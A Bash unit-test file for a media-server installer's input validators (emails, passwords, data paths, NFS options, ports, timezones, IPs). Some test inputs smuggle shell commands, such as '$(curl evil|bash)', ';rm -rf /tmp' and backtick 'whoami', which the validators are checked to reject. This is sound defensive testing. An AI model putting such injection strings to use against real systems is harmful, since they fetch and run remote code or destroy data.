#!/usr/bin/env bash
# tests/unit/validators.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

source "$REPO_ROOT/tests/lib/assert.sh"
CURRENT_SCENARIO="validators"
scenario_begin "$CURRENT_SCENARIO"

source "$REPO_ROOT/scripts/lib/validators.sh"

set +e
set +u

WARN_COUNT=0
LAST_WARN=""
UI_CONFIRM_RESPONSE="yes"

ui_log() {
    local level="$1"
    shift
    if [[ "$level" == "warn" ]]; then
        WARN_COUNT=$((WARN_COUNT + 1))
        LAST_WARN="$*"
    fi
}

ui_confirm() {
    [[ "${UI_CONFIRM_RESPONSE:-yes}" == "yes" ]]
}

sudo() {
    "$@"
}

reset_warn() {
    WARN_COUNT=0
    LAST_WARN=""
}

# ---------------------------------------------------------------------------
# Admin identity validators
# ---------------------------------------------------------------------------
reset_warn
validate_admin_user "media_admin"; rc=$?
assert_eq "0" "$rc" "validate_admin_user: accepts valid username"
assert_eq "0" "$WARN_COUNT" "validate_admin_user: valid username emits no warn"

reset_warn
validate_admin_user "ab"; rc=$?
assert_eq "1" "$rc" "validate_admin_user: rejects too-short username"
assert_eq "1" "$WARN_COUNT" "validate_admin_user: too-short warns once"

reset_warn
validate_admin_user "bad'name"; rc=$?
assert_eq "1" "$rc" "validate_admin_user: rejects single quote"
assert_contains "$LAST_WARN" "single quote" "validate_admin_user: single-quote copy"

reset_warn
validate_admin_email "owner@example.net"; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects example.net"
assert_eq "1" "$WARN_COUNT" "validate_admin_email: example.net warns once"

reset_warn
validate_admin_email "owner@home.test"; rc=$?
assert_eq "0" "$rc" "validate_admin_email: accepts real email"

reset_warn
validate_admin_email "invalid-email"; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects malformed email"
assert_contains "$LAST_WARN" "user@domain.tld" "validate_admin_email: malformed copy"

# BL-01: defense in depth — shell metacharacters that would break out of
# the single-quoted NPM_ADMIN_EMAIL line on .env source.
reset_warn
validate_admin_email "alice'@x.com"; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects single quote"
assert_contains "$LAST_WARN" "single quote" "validate_admin_email: single-quote copy"

reset_warn
validate_admin_email '$(curl evil|bash)@x.com'; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects \$ command substitution"

reset_warn
validate_admin_email 'a@b;evil.com'; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects ;"

reset_warn
validate_admin_email "alice @x.com"; rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects whitespace"

# WR-02: 1-char TLD must be rejected at Stage 1 (LE rejects it later).
reset_warn
validate_admin_email "alice@x.c"; rc=$?
assert_eq "1" "$rc" "validate_admin_email (WR-02): rejects 1-char TLD"
assert_contains "$LAST_WARN" "TLD" "validate_admin_email (WR-02): TLD copy"

reset_warn
validate_admin_email "alice@example.co"; rc=$?
assert_eq "0" "$rc" "validate_admin_email (WR-02): accepts 2-char TLD"

reset_warn
validate_admin_password "longenough12"; rc=$?
assert_eq "0" "$rc" "validate_admin_password: accepts 12+ chars with 2 character types"

reset_warn
validate_admin_password "longenoughpw"; rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects 12+ chars with only 1 character type"

reset_warn
validate_admin_password "11charssss"; rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects 10 chars (below Portainer floor)"

reset_warn
validate_admin_password "short"; rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects short password"
assert_eq "1" "$WARN_COUNT" "validate_admin_password: short warns once"

reset_warn
validate_admin_password "bad'quote"; rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects single quote"

# ---------------------------------------------------------------------------
# DDNS credential validator
# ---------------------------------------------------------------------------
reset_warn
validate_ddns_credential "Dynu password" "dynu-secret"; rc=$?
assert_eq "0" "$rc" "validate_ddns_credential: accepts a normal DDNS credential"

reset_warn
validate_ddns_credential "Dynu password" 'secret with $ and \ and " chars'; rc=$?
assert_eq "0" "$rc" "validate_ddns_credential: accepts shell-special chars except single quote"

reset_warn
validate_ddns_credential "Dynu password" "bad'quote"; rc=$?
assert_eq "1" "$rc" "validate_ddns_credential: rejects single quote"
assert_contains "$LAST_WARN" "single quote" "validate_ddns_credential: single-quote copy"

# ---------------------------------------------------------------------------
# Multi-provider DDNS field validators (epic #234)
# ---------------------------------------------------------------------------
# Opaque secret validators (token / api_key): required, contiguous, .env-safe.
for v in validate_ddns_token validate_api_key; do
    reset_warn
    "$v" "abc123_TOKEN-value"; rc=$?
    assert_eq "0" "$rc" "$v: accepts a normal opaque secret"
    assert_eq "0" "$WARN_COUNT" "$v: valid secret emits no warn"

    reset_warn
    "$v" $'  abc123_TOKEN-value \n'; rc=$?
    assert_eq "0" "$rc" "$v: trims surrounding whitespace from a dashboard paste"
    assert_eq "0" "$WARN_COUNT" "$v: pasted surrounding whitespace emits no warn"

    reset_warn
    "$v" ""; rc=$?
    assert_eq "1" "$rc" "$v: rejects empty"

    reset_warn
    "$v" "   "; rc=$?
    assert_eq "1" "$rc" "$v: rejects whitespace-only"

    reset_warn
    "$v" "has space"; rc=$?
    assert_eq "1" "$rc" "$v: rejects internal space (paste error)"
    assert_contains "$LAST_WARN" "space" "$v: space copy"

    reset_warn
    "$v" "bad'quote"; rc=$?
    assert_eq "1" "$rc" "$v: rejects single quote"
    assert_contains "$LAST_WARN" "single quote" "$v: single-quote copy"
done

# Cloudflare Zone ID: exactly 32 hex chars.
reset_warn
validate_zone_id "0123456789abcdef0123456789abcdef"; rc=$?
assert_eq "0" "$rc" "validate_zone_id: accepts 32 lowercase hex"

reset_warn
validate_zone_id "0123456789ABCDEF0123456789ABCDEF"; rc=$?
assert_eq "0" "$rc" "validate_zone_id: accepts 32 uppercase hex"

reset_warn
validate_zone_id $'  0123456789abcdef0123456789abcdef \n'; rc=$?
assert_eq "0" "$rc" "validate_zone_id: trims surrounding whitespace from a paste"

reset_warn
validate_zone_id ""; rc=$?
assert_eq "1" "$rc" "validate_zone_id: rejects empty"

reset_warn
validate_zone_id "0123456789abcdef"; rc=$?
assert_eq "1" "$rc" "validate_zone_id: rejects too-short (16 hex)"
assert_contains "$LAST_WARN" "32 hex" "validate_zone_id: length copy"

reset_warn
validate_zone_id "0123456789abcdef0123456789abcdeg"; rc=$?
assert_eq "1" "$rc" "validate_zone_id: rejects non-hex character"

# ---------------------------------------------------------------------------
# Data directory validator
# ---------------------------------------------------------------------------
TMP_DIR=$(mktemp -d)
trap 'rm -rf "$TMP_DIR"' EXIT

reset_warn
findmnt() { echo "rw,relatime"; }
df() { printf 'Filesystem 1G-blocks Used Avail Use%% Mounted\n/dev/sda1 200G 50G 150G 25%% %s\n' "${@: -1}"; }
validate_data_dir "$TMP_DIR"; rc=$?
assert_eq "0" "$rc" "validate_data_dir: accepts writable path with free space"
unset -f findmnt df

reset_warn
validate_data_dir "/media/usb"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects /media path"
assert_eq "1" "$WARN_COUNT" "validate_data_dir: /media warns once"

# BL-01 / WR-01: defense in depth — characters that would either escape the
# quoted DATA_DIR line on .env source, run as code, or silently corrupt
# downstream parsers (awk -F=, df, [[ -d ]] equality).
reset_warn
validate_data_dir "/data'foo"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects single quote"

reset_warn
validate_data_dir "/data\$HOME"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects \$"

reset_warn
validate_data_dir '/data;rm -rf /tmp'; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects ;"

reset_warn
validate_data_dir '/data`whoami`'; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects backticks"

# WR-01: structural footguns
reset_warn
validate_data_dir "data"; rc=$?
assert_eq "1" "$rc" "validate_data_dir (WR-01): rejects relative path"
assert_contains "$LAST_WARN" "absolute" "validate_data_dir (WR-01): relative-path copy"

reset_warn
validate_data_dir "/data with space"; rc=$?
assert_eq "1" "$rc" "validate_data_dir (WR-01): rejects whitespace"

reset_warn
validate_data_dir "/data=evil"; rc=$?
assert_eq "1" "$rc" "validate_data_dir (WR-01): rejects = (breaks awk -F=)"

reset_warn
validate_data_dir "/data
newline"; rc=$?
assert_eq "1" "$rc" "validate_data_dir (WR-01): rejects newline"

reset_warn
validate_data_dir "/data "; rc=$?
assert_eq "1" "$rc" "validate_data_dir (WR-01): rejects trailing whitespace"

reset_warn
UI_CONFIRM_RESPONSE="no"
validate_data_dir "$TMP_DIR/missing-denied"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: missing path respects refused mkdir"
assert_contains "$LAST_WARN" "not created" "validate_data_dir: refused mkdir copy"

reset_warn
UI_CONFIRM_RESPONSE="yes"
mkdir() { return 1; }
validate_data_dir "$TMP_DIR/missing-create-fails"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: mkdir failure rejects path"
unset -f mkdir

reset_warn
findmnt() { echo "rw,relatime,ro"; }
df() { printf 'Filesystem 1G-blocks Used Avail Use%% Mounted\n/dev/sda1 200G 50G 150G 25%% %s\n' "${@: -1}"; }
validate_data_dir "$TMP_DIR"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: rejects read-only mount"
unset -f findmnt df

reset_warn
findmnt() { echo "rw,relatime"; }
df() { printf 'Filesystem 1G-blocks Used Avail Use%% Mounted\n/dev/sda1 200G 180G 20G 90%% %s\n' "${@: -1}"; }
UI_CONFIRM_RESPONSE="no"
validate_data_dir "$TMP_DIR"; rc=$?
assert_eq "1" "$rc" "validate_data_dir: under-30GB free rejected when user declines to continue"
unset -f findmnt df

reset_warn
findmnt() { echo "rw,relatime"; }
df() { printf 'Filesystem 1G-blocks Used Avail Use%% Mounted\n/dev/sda1 200G 180G 20G 90%% %s\n' "${@: -1}"; }
UI_CONFIRM_RESPONSE="yes"
validate_data_dir "$TMP_DIR"; rc=$?
assert_eq "0" "$rc" "validate_data_dir: under-30GB free accepted when user confirms continue"
unset -f findmnt df

# ---------------------------------------------------------------------------
# NAS storage validators
# ---------------------------------------------------------------------------
reset_warn
validate_nfs_host "nas01.local"; rc=$?
assert_eq "0" "$rc" "validate_nfs_host: accepts DNS name"

reset_warn
ROOT_OWNED_MOUNTPOINT="$TMP_DIR/root-owned-mountpoint"
mkdir -p "$ROOT_OWNED_MOUNTPOINT"
chmod 0555 "$ROOT_OWNED_MOUNTPOINT"
findmnt() { echo "rw,relatime"; }
df() { printf 'Filesystem 1G-blocks Used Avail Use%% Mounted\n/dev/sda1 200G 50G 150G 25%% %s\n' "${@: -1}"; }
validate_data_dir "$ROOT_OWNED_MOUNTPOINT"; data_dir_rc=$?
validate_nas_mountpoint "$ROOT_OWNED_MOUNTPOINT"; nas_mount_rc=$?
chmod 0755 "$ROOT_OWNED_MOUNTPOINT"
assert_eq "1" "$data_dir_rc" "validate_data_dir: rejects non-writable root-owned path"
assert_eq "0" "$nas_mount_rc" "validate_nas_mountpoint: accepts existing non-writable mountpoint before mount"
unset -f findmnt df

reset_warn
validate_nfs_host "192.168.1.20"; rc=$?
assert_eq "0" "$rc" "validate_nfs_host: accepts IPv4"

reset_warn
validate_nfs_host "nas host"; rc=$?
assert_eq "1" "$rc" "validate_nfs_host: rejects whitespace"

reset_warn
validate_nfs_host "999.999.999.999"; rc=$?
assert_eq "1" "$rc" "validate_nfs_host: rejects IPv4 octet over 255"

reset_warn
validate_nfs_host "192.168.1"; rc=$?
assert_eq "1" "$rc" "validate_nfs_host: rejects incomplete IPv4"

reset_warn
validate_nfs_host "synology"; rc=$?
assert_eq "0" "$rc" "validate_nfs_host: accepts single-label hostname"

reset_warn
validate_nfs_host "10.0.08.5"; rc=$?
assert_eq "0" "$rc" "validate_nfs_host: accepts leading-zero octet (base-10, not octal)"

reset_warn
validate_nfs_export "/exports/mediastack"; rc=$?
assert_eq "0" "$rc" "validate_nfs_export: accepts absolute export path"

reset_warn
validate_nfs_export "exports/mediastack"; rc=$?
assert_eq "1" "$rc" "validate_nfs_export: rejects relative export path"
assert_contains "$LAST_WARN" "absolute" "validate_nfs_export: relative-path copy"

reset_warn
validate_nfs_export "/exports/bad path"; rc=$?
assert_eq "1" "$rc" "validate_nfs_export: rejects whitespace"

reset_warn
validate_nfs_options "vers=4.2,proto=tcp,rw,hard,timeo=600,retrans=2,nosuid,nodev,noexec"; rc=$?
assert_eq "0" "$rc" "validate_nfs_options: accepts default hard NFS options"

reset_warn
validate_nfs_options "vers=3,proto=tcp,rw,soft,timeo=10,retrans=1,nolock,nosuid,nodev,noexec"; rc=$?
assert_eq "0" "$rc" "validate_nfs_options: accepts NFSv3 test options"

reset_warn
validate_nfs_options "vers=4.2,proto=tcp,rw bad"; rc=$?
assert_eq "1" "$rc" "validate_nfs_options: rejects whitespace"

reset_warn
validate_nfs_options "vers=4.2,proto=tcp,rw,'bad'"; rc=$?
assert_eq "1" "$rc" "validate_nfs_options: rejects quotes"

reset_warn
validate_nfs_options "vers=4.2;rm"; rc=$?
assert_eq "1" "$rc" "validate_nfs_options: rejects shell separator"

reset_warn
validate_storage_sentinel "/data/.mediastack-storage-ready"; rc=$?
assert_eq "0" "$rc" "validate_storage_sentinel: accepts absolute sentinel path"

reset_warn
validate_storage_sentinel ".mediastack-storage-ready"; rc=$?
assert_eq "1" "$rc" "validate_storage_sentinel: rejects relative sentinel path"
assert_contains "$LAST_WARN" "absolute" "validate_storage_sentinel: relative-path copy"

reset_warn
validate_storage_sentinel "/data/bad sentinel"; rc=$?
assert_eq "1" "$rc" "validate_storage_sentinel: rejects whitespace"

# ---------------------------------------------------------------------------
# Port validators
# ---------------------------------------------------------------------------
reset_warn
ss() { printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'; }
validate_torrent_port "6881"; rc=$?
assert_eq "0" "$rc" "validate_torrent_port: accepts default port"
unset -f ss

reset_warn
validate_torrent_port "notaport"; rc=$?
assert_eq "1" "$rc" "validate_torrent_port: rejects non-numeric"

reset_warn
validate_torrent_port "70000"; rc=$?
assert_eq "1" "$rc" "validate_torrent_port: rejects out-of-range"

reset_warn
ss() {
    printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
    printf 'LISTEN 0      128          0.0.0.0:6881      0.0.0.0:*    users:(("qbittorrent",pid=1234,fd=5))\n'
}
validate_torrent_port "6881"; rc=$?
assert_eq "1" "$rc" "validate_torrent_port: rejects local collision"
assert_contains "$LAST_WARN" "qbittorrent" "validate_torrent_port: collision names process"
unset -f ss

reset_warn
# Non-smbd listener (e.g. a custom user-installed SMB server) → real conflict.
ss() {
    printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
    printf 'LISTEN 0      128          0.0.0.0:445       0.0.0.0:*    users:(("custom-smb",pid=222,fd=9))\n'
}
validate_smb_port 445; rc=$?
assert_eq "1" "$rc" "validate_smb_port: rejects occupied port 445 (non-smbd listener)"
assert_contains "$LAST_WARN" "custom-smb" "validate_smb_port: collision names non-smbd process"
unset -f ss

# smbd listener IS MediaStack's SMB share — not a conflict, must pass.
# This makes wizard re-runs idempotent after SMB has been enabled once.
reset_warn
ss() {
    printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
    printf 'LISTEN 0      128          0.0.0.0:445       0.0.0.0:*    users:(("smbd",pid=222,fd=9))\n'
}
validate_smb_port 445; rc=$?
assert_eq "0" "$rc" "validate_smb_port: accepts smbd on 445 (MediaStack-managed SMB)"
unset -f ss

reset_warn
ss() { printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'; }
validate_smb_port 445; rc=$?
assert_eq "0" "$rc" "validate_smb_port: accepts free port 445"
unset -f ss

# ---------------------------------------------------------------------------
# Timezone validator
# ---------------------------------------------------------------------------
reset_warn
validate_timezone "Etc/UTC"; rc=$?
assert_eq "0" "$rc" "validate_timezone: accepts Etc/UTC"

reset_warn
validate_timezone "Not/A_Real_Timezone"; rc=$?
assert_eq "1" "$rc" "validate_timezone: rejects invalid timezone"
assert_eq "1" "$WARN_COUNT" "validate_timezone: invalid timezone warns once"

# WR-03: tzdata metadata files (zone.tab, posixrules, ...) are -e but NOT
# valid TZ values. Glibc's tzset can't parse them and every timezone-aware
# container would silently misbehave. Validator must reject them with a
# useful "use a real zone like Etc/UTC" message.
if [[ -f /usr/share/zoneinfo/zone.tab ]]; then
    reset_warn
    validate_timezone "zone.tab"; rc=$?
    assert_eq "1" "$rc" "validate_timezone (WR-03): rejects zone.tab metadata file"
    assert_contains "$LAST_WARN" "metadata" "validate_timezone (WR-03): metadata copy"
fi

# WR-03: directory leaf (e.g. 'Etc' on its own) is -e but is a directory,
# not a regular file. Switch to -f makes it fail with the standard
# "not found" message.
if [[ -d /usr/share/zoneinfo/Etc ]]; then
    reset_warn
    validate_timezone "Etc"; rc=$?
    assert_eq "1" "$rc" "validate_timezone (WR-03): rejects bare directory (Etc)"
fi

# ---------------------------------------------------------------------------
# Subtitle languages (#11) — reject typo'd / unsupported / empty input so
# Bazarr never silently ends up with zero languages. Validator lowercases each
# token internally to check, so capitalised input is accepted (the stage1 call
# site stores the lowercased value).
# ---------------------------------------------------------------------------
reset_warn
validate_subtitle_langs "english"; rc=$?
assert_eq "0" "$rc" "validate_subtitle_langs: accepts a single supported language"
assert_eq "0" "$WARN_COUNT" "validate_subtitle_langs: valid input emits no warn"

reset_warn
validate_subtitle_langs "english,spanish,french"; rc=$?
assert_eq "0" "$rc" "validate_subtitle_langs: accepts a comma list of supported languages"

reset_warn
validate_subtitle_langs "English, SPANISH"; rc=$?
assert_eq "0" "$rc" "validate_subtitle_langs: accepts mixed-case (case-insensitive)"

reset_warn
validate_subtitle_langs "english,"; rc=$?
assert_eq "0" "$rc" "validate_subtitle_langs: accepts a trailing comma (empty token skipped)"

reset_warn
validate_subtitle_langs "klingon"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects an unsupported language"
assert_eq "1" "$WARN_COUNT" "validate_subtitle_langs: unsupported warns once"
assert_contains "$LAST_WARN" "klingon" "validate_subtitle_langs: warn names the bad token"
assert_contains "$LAST_WARN" "Supported" "validate_subtitle_langs: warn lists the supported set"

reset_warn
validate_subtitle_langs "englsih"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects a typo'd language"

reset_warn
validate_subtitle_langs "english,klingon"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects when one token of several is bad"
assert_contains "$LAST_WARN" "klingon" "validate_subtitle_langs: warn names only the bad token"

reset_warn
validate_subtitle_langs ""; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects empty input"
assert_eq "1" "$WARN_COUNT" "validate_subtitle_langs: empty warns once"

reset_warn
validate_subtitle_langs ",,,"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects commas-only (zero real tokens)"

reset_warn
validate_subtitle_langs "   "; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects whitespace-only input"

reset_warn
validate_subtitle_langs "english spanish"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: rejects space-separated (one bad token, only comma splits)"

# Whole-word membership: a substring of a supported key must NOT pass.
reset_warn
validate_subtitle_langs "dan"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs: 'dan' does not match 'danish'"

# Drift guard: the validator's supported set must equal Bazarr's LANG_MAP keys.
# Extract the 19 keys with an anchored grep (matches '    'english':    {'code2'),
# which avoids the unrelated quoted tokens elsewhere in the file (code2/code3/en).
LANG_MAP_KEYS=$(grep -oP "^\s+'\K[a-z]+(?=':\s+\{'code2')" \
    "$REPO_ROOT/scripts/services/bazarr/main.sh")
LANG_MAP_COUNT=$(printf '%s\n' "$LANG_MAP_KEYS" | grep -c .)
assert_eq "19" "$LANG_MAP_COUNT" "validate_subtitle_langs (drift): LANG_MAP has 19 keys"
while IFS= read -r _key; do
    [[ -z "$_key" ]] && continue
    reset_warn
    validate_subtitle_langs "$_key"; rc=$?
    assert_eq "0" "$rc" "validate_subtitle_langs (drift): accepts LANG_MAP key '$_key'"
done <<< "$LANG_MAP_KEYS"

# Bidirectional set-equality: the validator's own `supported` set must equal the
# LANG_MAP keys exactly — both directions. The per-key loop above only proves the
# validator accepts every LANG_MAP key (superset); this also catches a future
# EXTRA entry in validators.sh that LANG_MAP lacks, which would silently
# reintroduce the zero-language drop for that word.
LANG_MAP_SET=$(printf '%s\n' "$LANG_MAP_KEYS" | sort -u | paste -sd, -)
VALIDATOR_SET=$(grep -oP 'local supported="\K[^"]+' \
    "$REPO_ROOT/scripts/lib/validators.sh" | tr ' ' '\n' | sort -u | paste -sd, -)
assert_eq "$LANG_MAP_SET" "$VALIDATOR_SET" \
    "validate_subtitle_langs (drift): validator set == LANG_MAP keys exactly (both directions)"

reset_warn
validate_subtitle_langs "zzznotalang"; rc=$?
assert_eq "1" "$rc" "validate_subtitle_langs (drift): rejects a non-LANG_MAP sentinel"

# ---------------------------------------------------------------------------
# MB/s speed-limit validator (qBittorrent DL/UL; #50). Distinct from the Mbps
# validators: same grammar, unit-correct "MB/s" copy. 0 = unlimited.
# ---------------------------------------------------------------------------
for ok in "0" "5" "1.5" "100" "0.5"; do
    reset_warn
    validate_mb_per_sec "$ok"; rc=$?
    assert_eq "0" "$rc" "validate_mb_per_sec: accepts '$ok'"
    assert_eq "0" "$WARN_COUNT" "validate_mb_per_sec: '$ok' emits no warn"
done

for bad in "" "abc" "1.2.3" "5mb" "-1" "1," "1 "; do
    reset_warn
    validate_mb_per_sec "$bad"; rc=$?
    assert_eq "1" "$rc" "validate_mb_per_sec: rejects '$bad'"
    assert_eq "1" "$WARN_COUNT" "validate_mb_per_sec: '$bad' warns once"
done

reset_warn
validate_mb_per_sec "x"; rc=$?
assert_contains "$LAST_WARN" "MB/s" "validate_mb_per_sec: warn copy says MB/s (not Mbps)"

# ---------------------------------------------------------------------------
# Single-IP validator (fail2ban whitelist manual-entry path; #276). Accepts one
# IPv4/IPv6 host; rejects CIDR / range / hostname / empty.
# ---------------------------------------------------------------------------
for ok in "203.0.113.45" "::1" "2001:db8::1"; do
    reset_warn
    validate_ip "$ok"; rc=$?
    assert_eq "0" "$rc" "validate_ip: accepts '$ok'"
    assert_eq "0" "$WARN_COUNT" "validate_ip: '$ok' emits no warn"
done

for bad in "1.2.3.4/32" "999.1.1.1" "nope" ""; do
    reset_warn
    validate_ip "$bad"; rc=$?
    assert_eq "1" "$rc" "validate_ip: rejects '$bad'"
    assert_eq "1" "$WARN_COUNT" "validate_ip: '$bad' warns once"
done

scenario_end "$CURRENT_SCENARIO"
summary
